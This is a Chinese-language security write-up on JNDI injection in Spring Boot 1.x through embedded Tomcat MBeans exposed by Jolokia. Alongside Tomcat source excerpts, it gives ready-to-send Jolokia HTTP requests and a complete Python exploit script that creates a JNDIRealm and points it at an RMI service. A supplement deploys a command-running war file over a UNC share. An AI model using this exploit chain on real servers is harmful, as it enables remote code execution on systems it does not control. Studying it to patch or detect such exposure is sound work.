<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Spring Boot Tomcat导致的JNDI注入</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Spring Boot 1 - 1.4</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>spring Boot 内嵌了一个 Tomcat，所以在 MBean 列表中列出了 Tomcat 的 MBean。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的 MBean operation。</p><ol class="pydocx-list-style-type-decimal"><li>Tomcat:type=MBeanFactory createJNDIRealm -&gt; JNDI Injection</li><li>Tomcat:type=MBeanFactory createJDBCRealm -&gt; JNDI Injection</li><li>Tomcat:type=MBeanFactory createDataSourceRealm -&gt; JNDI Injection</li><li>Tomcat:type=MBeanFactory createUserDatabaseRealm -&gt; JNDI Injection</li><li>Tomcat:type=MBeanFactory createValve -&gt; Create Valve (File Writting, JNDI Injection)<br />这里举一个 createUserDatabaseRealm 的例子：<br />  FILE: tomcat-embed-core-8.5.15-sources.jar!\org\apache\catalina\mbeans\MBeanFactory.java<br />   public String createUserDatabaseRealm(String parent, String resourceName)<br />       throws Exception {<br /><br />        // Create a new UserDatabaseRealm instance<br />       UserDatabaseRealm realm = new UserDatabaseRealm();<br />       realm.setResourceName(resourceName);<br />       <br />       // Add the new instance to its parent component<br />       ObjectName pname = new ObjectName(parent);<br />       Container container = getParentContainerFromParent(pname);<br />       // Add the new instance to its parent component<br />       container.setRealm(realm);<br />       // Return the corresponding MBean name<br />       ObjectName oname = realm.getObjectName();<br />       // FIXME getObjectName() returns null<br />       //ObjectName oname =<br />       //    MBeanUtils.createObjectName(pname.getDomain(), realm);<br />       if (oname != null) {<br />           return (oname.toString());<br />       } else {<br />           return null;<br />       }<br /><br />   }<br />调用 setter 把 resourceName 写入。接着在 start Realm 的时候，会调用以下函数：<br />FILE: tomcat-embed-core\8.5.15-embed-core-8.5.15-sources.jar!.java<br />   @Override<br />   protected void startInternal() throws LifecycleException {<br /><br />       try {<br />           Context context = getServer().getGlobalNamingContext();<br />           database = (UserDatabase) context.lookup(resourceName);<br />       } catch (Throwable e) {<br />           ExceptionUtils.handleThrowable(e);<br />           containerLog.error(sm.getString("userDatabaseRealm.lookup",<br />                                           resourceName),<br />                              e);<br />           database = null;<br />       }<br />       if (database == null) {<br />           throw new LifecycleException<br />               (sm.getString("userDatabaseRealm.noDatabase", resourceName));<br />       }<br />       <br />       super.startInternal();<br /><br />   }<br />是不是非常熟悉的场景？context.lookup(resourceName)，而 resourceName 可控，那么可以直接JNDI 注入了。但是遗憾的是getServer().getGlobalNamingContext() 返回的是 null，所以在lookup的时候抛了 NullPointer 的错误。还有一些奇奇怪怪的 Bug，比如利用 createValve 创建一个JDBCAccessLogValve，但是利用 Jolokia 设置其 driverName 的时候，由于 driverName 没有getter，导致 Jolokia 不能正常设置；再比如 createJDBCRealm 的时候，由于这个方法接受的参数和MBean 导出（mbeans-descriptors.xml）的配置文件内写的参数数量不一致导致无法调用这个 MBean operation。<br /><strong><em>createJNDIRealm</em></strong><br />在多次尝试后，最终我盯上了 createJNDIRealm 这个方法。<br />FILE: tomcat-embed-core-8.5.15-sources.jar!.java<br />public String createJNDIRealm(String parent)<br />    throws Exception {<br /><br />     // Create a new JNDIRealm instance<br />    JNDIRealm realm = new JNDIRealm();<br /><br />    // Add the new instance to its parent component<br />    ObjectName pname = new ObjectName(parent);<br />    Container container = getParentContainerFromParent(pname);<br />    // Add the new instance to its parent component<br />    container.setRealm(realm);<br />    // Return the corresponding MBean name<br />    ObjectName oname = realm.getObjectName();<br /><br />    if (oname != null) {<br />        return (oname.toString());<br />    } else {<br />        return null;<br />    }<br />}<br />这里只传入了 parent。利用 Burpsuite 先创建这个 Realm。<br />POST /jolokia/ HTTP/1.1<br />Host: localhost<br />Content-Type: application/json<br />Content-Length: 133<br />{<br />    "type": "EXEC",<br />    "mbean": "Tomcat:type=MBeanFactory",<br />    "operation": "createJNDIRealm",<br />    "arguments": ["Tomcat:type=Engine"]<br />}<br />创建成功后，我们查看这个 Realm 的 MBean 信息：<br />realmPath=/realm0,type=Realm: {<br />    op: {...},<br />    attr: {<br />        userPassword: {},<br />        ...<br />        connectionURL: {<br />            rw: true,<br />            type: "java.lang.String",<br />            desc: "The connection URL for the server we will contact"<br />        },<br />        roleNested: {},<br />        userSearch: {},<br />        connectionTimeout: {},<br />        authentication: {},<br />        contextFactory: {<br />            rw: true,<br />            type: "java.lang.String",<br />            desc: "The JNDI context factory for this Realm"<br />        },<br />        userPattern: {},<br />        ...<br />    },<br />    class: "org.apache.tomcat.util.modeler.BaseModelMBean",<br />    desc: "Implementation of Realm that works with a directory server a..."<br />}<br />注意到两个有意思的属性，connectionURL 和 contextFactory。查看 JNDIRealm 的源码：<br />FILE: <br /><br />   protected Hashtable&lt;String, String&gt; getDirectoryContextEnvironment() {<br />        Hashtable&lt;String, String&gt; env = new Hashtable();<br />        if (this.containerLog.isDebugEnabled() &amp;&amp; this.connectionAttempt == 0) {<br />            this.containerLog.debug("Connecting to URL " + this.connectionURL);<br />        } else if (this.containerLog.isDebugEnabled() &amp;&amp; this.connectionAttempt &gt; 0) {<br />            this.containerLog.debug("Connecting to URL " + this.alternateURL);<br />        }<br />        env.put("java.naming.factory.initial", this.contextFactory);<br />    if (this.connectionName != null) {<br />        env.put("java.naming.security.principal", this.connectionName);<br />    }<br /><br />    if (this.connectionPassword != null) {<br />        env.put("java.naming.security.credentials", this.connectionPassword);<br />    }<br />    <br />    if (this.connectionURL != null &amp;&amp; this.connectionAttempt == 0) {<br />        env.put("java.naming.provider.url", this.connectionURL);<br />    } else if (this.alternateURL != null &amp;&amp; this.connectionAttempt &gt; 0) {<br />        env.put("java.naming.provider.url", this.alternateURL);<br />    }<br />    <br />    ...<br />    <br />    return env;<br />}<br /><br />private DirContext createDirContext(Hashtable&lt;String, String&gt; env) throws NamingException {<br />    return (DirContext)(this.useStartTls ? this.createTlsDirContext(env) : new InitialDirContext(env));<br />}<br />可见 java.naming.factory.initial 和 java.naming.provider.url 我们都可以通过 MBean 来进行修改，接着在 createDirContext 方法，利用刚才的 env 创建了 InitialDirContext 对象。最终可以造成JNDI 注入。于是我满怀欣喜的搭建好 RMI Service，却发现爆了这么一个错误：<br />javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.<br />    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) ~[na:1.8.0_121]<br />    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) ~[na:1.8.0_121]<br />    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) ~[na:1.8.0_121]<br />    at com.sun.jndi.url.rmi.rmiURLContextFactory.getUsingURL(rmiURLContextFactory.java:71) ~[na:1.8.0_121]<br />    at com.sun.jndi.url.rmi.rmiURLContextFactory.getObjectInstance(rmiURLContextFactory.java:56) ~[na:1.8.0_121]<br />    at com.sun.jndi.rmi.registry.RegistryContextFactory.URLToContext(RegistryContextFactory.java:102) ~[na:1.8.0_121]<br />    at com.sun.jndi.rmi.registry.RegistryContextFactory.getInitialContext(RegistryContextFactory.java:69) ~[na:1.8.0_121]<br />    ...<br /><strong>漏洞复现</strong><br />由于 Spring Boot 内嵌了 Tomcat 和 Tomcat EL，可以直接使用文章中的 Exploit。最终 Exploit 触发分为五个步骤。<ol class="pydocx-list-style-type-lowerLetter"><li>创建 JNDIRealm</li><li>写入 connectionURL 为你的 RMI Service URL</li><li>写入 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发 JNDI 注入</li></ol></li></ol><p>最终 Exploit 如下：</p><p> import requests, sys, time, pprint<br /><br /> url = sys.argv[1]<br /><br /> create_realm = {<br />     "mbean": "Tomcat:type=MBeanFactory",<br />     "type": "EXEC",<br />     "operation": "createJNDIRealm",<br />     "arguments": ["Tomcat:type=Engine"]<br /> }<br /><br /> wirte_factory = {<br />     "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />     "type": "WRITE",<br />     "attribute": "contextFactory",<br />     "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"<br /> }<br /><br /> write_url = {<br />     "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />     "type": "WRITE",<br />     "attribute": "connectionURL",<br />     "value": "rmi://localhost:1097/Object"<br /> }<br /><br /> stop = {<br />     "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />     "type": "EXEC",<br />     "operation": "stop",<br />     "arguments": []<br /> }<br /><br /> start = {<br />     "mbean": "Tomcat:realmPath=/realm0,type=Realm",<br />     "type": "EXEC",<br />     "operation": "start",<br />     "arguments": []<br /> }<br /><br /> flow = [create_realm, wirte_factory, write_url, stop, start]<br /><br /> for i in flow:<br />     print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))<br />     requests.post(url, json=i).json()</p><h3>补充</h3><p><strong>利用UNC部署war文件（只能用于windows）</strong></p><p>在 Tomcat Host Manager 这里可以利用 UNC 来部署 war 文件。实际上对于Tomcat:type=MBeanFactory 的createStandardHost，和 Host Manager 这里调用的是相同的方法。所以根据文章所述的方法，我们同样可以在Jolokia 里重现。不过可惜的是这里只对 Windows 有效。 首先去 spring-boot 的 Github 下载 spring-boot-samples-traditional，在 web.xml 里添加如下内容：</p><p>&lt;servlet&gt;<br />    &lt;servlet-name&gt;default&lt;/servlet-name&gt;<br />    &lt;servlet-class&gt;<br />        org.apache.catalina.servlets.DefaultServlet<br />    &lt;/servlet-class&gt;<br />    &lt;init-param&gt;<br />        &lt;param-name&gt;debug&lt;/param-name&gt;<br />        &lt;param-value&gt;0&lt;/param-value&gt;<br />    &lt;/init-param&gt;<br />    &lt;init-param&gt;<br />        &lt;param-name&gt;listings&lt;/param-name&gt;<br />        &lt;param-value&gt;false&lt;/param-value&gt;<br />    &lt;/init-param&gt;<br />    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;<br />&lt;/servlet&gt;<br /><br />&lt;servlet-mapping&gt;<br />    &lt;servlet-name&gt;default&lt;/servlet-name&gt;<br />    &lt;url-pattern&gt;/default&lt;/url-pattern&gt;<br />&lt;/servlet-mapping&gt;</p><p>然后修改 WebConfig.java，在 dispatcherServlet 添加执行命令的代码：</p><p>@Bean<br />// Only used when running in embedded servlet<br />public DispatcherServlet dispatcherServlet() throws Exception {<br />    Runtime.getRuntime().exec("calc");<br />    return new DispatcherServlet();<br />}</p><p>接着打包成 war 文件放在远程的共享服务器上面，发送如下请求即可：</p><p>POST /jolokia HTTP/1.1<br />Host: localhost<br />Content-Type: application/json<br />Content-Length: 192<br /><br />{<br />    "mbean": "Tomcat:type=MBeanFactory",<br />    "type": "EXEC",<br />    "operation": "createStandardHost",<br />    "arguments": ["Tomcat:type=Engine", "test2", "\\127.0.0.1\test", true, true, true, true]<br />}</p></body></html>